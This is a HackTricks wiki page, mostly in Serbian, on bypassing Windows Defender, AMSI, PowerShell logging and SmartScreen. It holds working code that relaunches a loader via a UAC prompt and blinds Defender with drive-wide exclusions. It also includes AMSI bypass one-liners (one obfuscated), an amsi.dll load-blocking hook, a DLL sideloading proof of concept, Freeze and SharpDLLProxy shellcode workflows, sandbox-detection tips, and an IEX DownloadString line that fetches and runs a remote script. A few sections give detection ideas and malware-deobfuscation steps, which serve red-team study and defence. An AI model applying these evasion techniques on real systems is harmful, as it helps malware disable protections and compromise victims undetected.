# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavi Defender

- [defendnot](https://github.com/es3n1n/defendnot): Alat za onemogućavanje Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za onemogućavanje Windows Defender-a lažirajući drugi AV.
- [Onemogući Defender ako si admin](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalera pre menjanja Defender-a

Javni loaderi koji se predstavljaju kao game cheats često dolaze kao unsigned Node.js/Nexe instalateri koji prvo **traže od korisnika elevaciju** i tek onda onesposobe Defender-a. Tok je jednostavan:

1. Proveri administratorski kontekst pomoću `net session`. Komanda uspeva samo kada pozivalac ima administratorska prava, tako da neuspeh ukazuje da se loader pokreće kao standardni korisnik.
2. Odmah se ponovo pokreće sa `RunAs` verbom da bi pokrenuo očekivani UAC upit za saglasnost, pri čemu zadržava originalnu komandnu liniju.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju “cracked” softver, pa se prompt obično prihvati, dajući malware-u prava koja su mu potrebna da promeni politiku Defendera.

### Opšti `MpPreference` izuzeci za svako slovo diska

Kada se dobiju povišene privilegije, GachiLoader-style chains maksimiziraju slepe tačke Defendera umesto da direktno onemoguće servis. Loader prvo ubija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) i zatim dodaje **izuzetno široke izuzetke** tako da svaki korisnički profil, sistemski direktorijum i prenosivi disk ne mogu da se skeniraju:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop prolazi kroz svaki montirani filesystem (D:\, E:\, USB sticks, itd.) tako da je budući payload koji se ostavi bilo gde na disku **ignorisan**.
- Isključenje ekstenzije `.sys` je usmereno unapred — napadači tako ostavljaju opciju da kasnije učitaju unsigned drivere bez ponovnog dodirivanja Defender-a.
- Sve izmene se upisuju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što omogućava kasnijim fazama da potvrde da izuzeci ostaju ili da ih prošire bez ponovnog izazivanja UAC-a.

Pošto nijedan Defender servis nije zaustavljen, naivni health check-ovi i dalje prijavljuju “antivirus active” iako real-time inspekcija nikada ne dodiruje te putanje.

## **Metodologija izbegavanja AV-a**

Trenutno, AV-ovi koriste različite metode za proveru da li je fajl maliciozan: statičku detekciju, dinamičku analizu, i kod naprednijih EDR-ova, behavioural analizu.

### **Staticka detekcija**

Statička detekcija se postiže flagovanjem poznatih malicioznih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i izvlačenjem informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može dovesti do lakšeg otkrivanja, jer su verovatno već analizirani i označeni kao maliciozni. Postoji nekoliko načina da se zaobiđe ovakva detekcija:

- **Šifrovanje**

Ako šifrujete binar, AV neće moći da detektuje vaš program, ali će vam trebati neki loader da dešifruje i pokrene program u memoriji.

- **Obfuskacija**

Ponekad je dovoljno promeniti neke stringove u binarnom fajlu ili skripti da biste prošli pored AV-a, ali to može biti vremenski zahtevno u zavisnosti šta pokušavate da obfuskirate.

- **Prilagođeni alati**

Ako razvijete sopstvene alate, neće postojati poznati loši signaturi, ali to zahteva puno vremena i truda.

> [!TIP]
> Dobar način za proveru statičke detekcije od strane Windows Defender-a je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On praktično deli fajl na više segmenata i zadacima Defender da skenira svaki pojedinačno; na taj način može tačno da vam kaže koji stringovi ili bajtovi u vašem binarnom fajlu su flagovani.

Toplo preporučujem da pogledate ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom izbegavanju AV-a.

### **Dinamička analiza**

Dinamička analiza je kad AV pokreće vaš binarni u sandbox-u i posmatra malicioznu aktivnost (npr. pokušaj dešifrovanja i čitanja browser password-a, pravljenje minidump-a LSASS-a, itd.). Ovaj deo može biti zahtevniji za zaobilaženje, ali evo nekoliko stvari koje možete uraditi da izbegnete sandbox-e.

- **Spavanje pre izvršenja** U zavisnosti od implementacije, može biti odličan način da se zaobiđe dinamička analiza AV-a. AV-ovi imaju vrlo malo vremena da skeniraju fajlove kako ne bi prekidali korisnikov rad, pa korišćenje dugih sleep-ova može poremetiti analizu binarnih fajlova. Problem je što mnogi sandbox-i mogu preskočiti sleep u zavisnosti od implementacije.
- **Provera resursa mašine** Obično sandbox-ovi imaju vrlo malo resursa (npr. < 2GB RAM), inače bi mogli usporiti korisnikov računar. Možete biti i vrlo kreativni ovde, na primer proverom temperature CPU-a ili čak brzine ventilatora—neće sve biti implementirano u sandbox-u.
- **Provere specifične za mašinu** Ako želite da ciljate korisnika čija je radna stanica priključena na domen "contoso.local", možete proveriti domen računara da vidite da li se poklapa sa onim koji ste naveli; ako se ne poklapa, možete svoj program zatvoriti.

Ispostavilo se da je Sandbox ime računara Microsoft Defender-a HAL9TH, tako da možete proveriti ime računara u svom malveru pre detonacije; ako ime odgovara HAL9TH, znači da ste unutar Defender-ovog sandbox-a i možete napraviti da se program zatvori.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Neki drugi zaista dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za rad protiv sandbox-ova

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **javni alati** će se na kraju **otkriti**, pa treba postaviti pitanje:

Na primer, ako želite da dump-ujete LSASS, **da li zaista morate koristiti mimikatz**? Ili možete koristiti neki drugi projekat koji je manje poznat i takođe dump-uje LSASS.

Ispravni odgovor je verovatno drugo. Uzimajući mimikatz za primer, on je verovatno jedan od, ako ne i najviše flagovanih komada malvera od strane AV-ova i EDR-ova; iako je projekat sam po sebi super, takođe je noćna mora pokušavati ga koristiti da biste zaobišli AV, pa jednostavno tražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada modifikujete svoje payload-ove radi izbegavanja, obavezno **isključite automatsko slanje uzoraka** u Defender-u, i molim vas, ozbiljno, **DO NOT UPLOAD TO VIRUSTOTAL** ako vam je cilj dugoročno postizanje izbegavanja. Ako želite da proverite da li vas payload detektuje neki konkretan AV, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i testirajte tamo dok ne budete zadovoljni rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **prioritizirajte korišćenje DLL-ova za izbegavanje**; iz mog iskustva, DLL fajlovi su obično **daleko manje detektovani** i analizirani, pa je to vrlo jednostavan trik da izbegnete detekciju u nekim slučajevima (ako vaš payload ima način da se izvrši kao DLL, naravno).

Kao što vidimo na ovoj slici, DLL Payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možete koristiti sa DLL fajlovima da biste bili mnogo stealth-iji.

## DLL Sideloading & Proxying

**DLL Sideloading** iskorišćava DLL search order koji loader koristi tako što postavi victim application i malicious payload(s) jedno pored drugog.

Možete proveriti programe podložne DLL Sideloading koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijacking unutar "C:\Program Files\\" i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da **explore DLL Hijackable/Sideloadable programs yourself**, ova tehnika je prilično stealthy ako se pravilno izvede, ali ako koristiš javno poznate DLL Sideloadable programe, možeš lako biti otkriven.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita, neće učitati tvoj payload, jer program očekuje neke specifične funkcije unutar tog DLL-a; da bismo rešili ovaj problem, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi iz proxy (i malicioznog) DLL-a ka originalnom DLL-u, čime se očuva funkcionalnost programa i omogućava izvršavanje tvog payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: DLL source code template i originalno preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (kodiran sa [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Toplo **preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading i takođe [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) kako biste detaljnije saznali o onome što smo diskutovali.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Učitaj `TargetDll` ako već nije učitan
- Razreši `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako `TargetDll` je KnownDLL, dobavlja se iz zaštićenog KnownDLLs namespace-a (npr., ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se normalan DLL search order, koji uključuje direktorijum modula koji vrši forward resolution.

Ovo omogućava indirektni sideloading primitive: pronađite potpisani DLL koji eksportuje funkciju forwardanu na modul koji nije KnownDLL, zatim postavite taj potpisani DLL zajedno sa attacker-controlled DLL koji se tačno zove kao forwarded target module. Kada se pozove forwarded export, loader razreši forward i učita vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Primer primećen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, tako da se rešava putem normalnog redosleda pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u folder u koji se može pisati
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u isti direktorijum. Minimalan DllMain je dovoljan da dobijete izvršavanje koda; ne morate implementirati prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite prosljeđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Dok rešava `KeyIsoSetAuditingInterface`, loader prati forward ka `NCRYPTPROV.SetAuditingInterface`
- Zatim loader učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njen `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što je `DllMain` već izvršen

Hunting tips:
- Fokusirajte se na forwarded exports gde ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete nabrojati forwarded exports pomoću alata kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar forwardera za Windows 11 da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt

Ideje za detekciju/odbranu:
- Pratite LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz nesistemskih putanja, a potom učitavaju non-KnownDLLs sa istim osnovnim imenom iz tog direktorijuma
- Podesite upozorenje na lance proces/modul poput: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` pod putanjama koje su upisive od strane korisnika
- Sprovodite politike integriteta koda (WDAC/AppLocker) i onemogućite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša — ono što danas funkcioniše može biti detektovano sutra, zato se nikada ne oslanjaj samo na jedan alat; ako je moguće, pokušaj kombinovati više evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči "fileless malware". Isprva su AVs mogli da skeniraju samo **fajlove na disku**, pa ako biste nekako izvršili payloads **direktno u memoriji**, AV ne bi mogao ništa da uradi da to spreči, jer nije imao dovoljno vidljivosti.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ovo omogućava antivirusnim rešenjima da ispituju ponašanje skripti tako što izlažu sadržaj skripti u obliku koji je nešifrovan i neobfuskovan.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju kako prepends `amsi:` a zatim putanju do izvršnog fajla iz kojeg je skripta pokrenuta — u ovom slučaju, powershell.exe.

Nismo postavili nijedan fajl na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI.

Štaviše, počevši od **.NET 4.8**, C# kod se takođe izvršava kroz AMSI. Ovo utiče čak i na `Assembly.Load(byte[])` pri učitavanju za izvršavanje u memoriji. Zato se preporučuje korišćenje nižih verzija .NET-a (npr. 4.7.2 ili niže) za in-memory execution ako želite izbeći AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi sa statičkim detekcijama, izmena skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima mogućnost unobfuscating skripti čak i ako imaju više slojeva, tako da obfuscation može biti loša opcija u zavisnosti od načina na koji je urađena. To čini zaobilaženje ne tako jednostavnim. Ipak, ponekad je dovoljno promeniti par imena promenljivih i bićete u redu, pa sve zavisi od toga koliko je nešto bilo označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u powershell proces (takođe cscript.exe, wscript.exe itd.), moguće je lako manipulisati njime čak i kada se radi kao neprivilegovan korisnik. Zbog ovog propusta u implementaciji AMSI-ja, istraživači su pronašli više načina da zaobiđu AMSI skeniranje.

**Forsiranje greške**

Forsiranje da AMSI inicijalizacija zakaže (amsiInitFailed) će rezultovati time da za trenutni proces ne bude pokrenuto skeniranje. Ovu metodu je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis (signature) da spreči širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bila je dovoljna samo jedna linija powershell koda da učini AMSI neupotrebljivim za trenutni powershell proces. Ova linija je naravno bila označena od strane samog AMSI, pa su potrebne neke izmene da bi se ova tehnika mogla koristiti.

Evo izmenjenog AMSI bypass-a koji sam uzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti označeno kada ova objava izađe, pa ne biste trebali objavljivati nikakav kod ako planirate ostati neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje ulaza koji obezbedi korisnik) i prepisivanje te funkcije instrukcijama koje vraćaju kod E_INVALIDARG; na taj način rezultat stvarnog skeniranja vraća 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike za zaobilaženje AMSI koristeći powershell; pogledajte [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što je `amsi.dll` učitan u trenutni proces. Robustan, nezavisan od jezika, bypass je postaviti user‑mode hook na `ntdll!LdrLoadDll` koji vraća grešku kada je traženi modul `amsi.dll`. Kao rezultat, AMSI se nikada ne učitava i skeniranja se ne vrše za taj proces.

Skica implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Beleške
- Radi u PowerShell, WScript/CScript i prilagođenim loaderima (bilo šta što bi inače učitalo AMSI).
- Koristite uz slanje skripti preko stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli duge artefakte u komandnoj liniji.
- Primećeno u upotrebi kod loadera koji se izvršavaju preko LOLBins (npr., `regsvr32` koji poziva `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Uklonite detektovani potpis**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite detektovani AMSI potpis iz memorije trenutnog procesa. Ovaj alat radi tako što skenira memoriju trenutnog procesa tražeći AMSI potpis i zatim ga prepisuje NOP instrukcijama, efikasno ga uklanjajući iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Možete pronaći listu AV/EDR proizvoda koji koriste AMSI u **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, tako da možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi:
```bash
powershell.exe -version 2
```
## PS logovanje

PowerShell logging je funkcija koja vam omogućava da evidentirate sve PowerShell komande izvršene na sistemu. Ovo može biti korisno za reviziju i rešavanje problema, ali takođe može predstavljati **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućavanje PowerShell Transcription i Module Logging**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) u tu svrhu.
- **Koristite PowerShell verziju 2**: Ako koristite PowerShell verziju 2, AMSI neće biti učitan, tako da možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi: `powershell.exe -version 2`
- **Koristite Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da spawn-ujete powershell bez odbrana (ovo je ono što `powerpick` iz Cobal Strike koristi).


## Obfuskacija

> [!TIP]
> Nekoliko obfuskacionih tehnika oslanja se na enkriptovanje podataka, što će povećati entropiju binarnog fajla i time olakšati otkrivanje od strane AVs i EDRs. Budite oprezni sa tim i razmotrite primenu enkripcije samo na određene delove koda koji su osetljivi ili treba da budu skriveni.

### Deobfuskacija ConfuserEx-zaštićenih .NET binarnih fajlova

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove) često ćete se suočiti sa više slojeva zaštite koji blokiraju dekompilere i sandbokse. Donji workflow pouzdano **vraća skoro originalni IL** koji se potom može dekompilovati u C# alatima kao što su dnSpy ili ILSpy.

1.  Uklanjanje anti-tampering zaštite – ConfuserEx enkriptuje svaki *method body* i dekriptuje ga unutar *module* statičkog konstruktora (`<Module>.cctor`). Ovo takođe menja PE checksum tako da će bilo koja modifikacija srušiti binarni fajl. Koristite **AntiTamperKiller** da pronađete enkriptovane metadata tabele, oporavite XOR ključeve i prepišete čist assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izgradnji sopstvenog unpacker-a.

2.  Oporavak simbola / control-flow – ubacite *clean* fajl u **de4dot-cex** (fork de4dot-a koji prepoznaje ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Parametri:
• `-p crx` – izaberite ConfuserEx 2 profil
• de4dot će poništiti control-flow flattening, vratiti originalne namespaces, klase i imena promenljivih i dekriptovati konstantne stringove.

3.  Uklanjanje proxy-call-ova – ConfuserEx zamenjuje direktne pozive metoda laganim wrapper-ima (takozvani *proxy calls*) kako bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalne .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()` umesto neprozračnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite rezultujući binarni fajl u dnSpy, potražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da locirate *pravi* payload. Često malware čuva payload kao TLV-enkodiran byte niz inicijalizovan unutar `<Module>.byte_0`.

Gore navedeni lanac vraća izvršni tok **bez** potrebe za pokretanjem zlonamernog uzorka – korisno kada radite na offline radnoj stanici.

🛈  ConfuserEx proizvodi custom atribut pod imenom `ConfusedByAttribute` koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### Jednolinijski primer
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompajlacionog skupa koji omogućava povećanu bezbednost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik da bi se generisao, u vreme kompajliranja, obfuscated code bez upotrebe bilo kog eksternog alata i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operations generisanih pomoću C++ template metaprogramming framework-a koji će otežati život osobi koja želi da raskrinka aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može obfuskovati različite PE fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za jezike koje podržava LLVM koristeći ROP (return-oriented programming). ROPfuscator obfuscira program na nivou assembly koda transformišući regularne instrukcije u ROP chains, remetivši našu uobičajenu predodžbu normalnog toka kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor je sposoban da konvertuje postojeće EXE/DLL u shellcode i zatim ih učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih executables sa interneta i pokušaja njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na osnovu reputacije, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen, upozoravajući i sprečavajući krajnjeg korisnika da izvrši fajl (iako se fajl i dalje može pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa koga je preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani sa **pouzdanim** potpisnim sertifikatom **neće aktivirati SmartScreen**.

Veoma efektan način da sprečite da vaši payloads dobiju Mark of The Web je da ih spakujete u neki kontejner, npr. ISO. To se dešava zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na non NTFS volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakira payloads u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer upotrebe:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

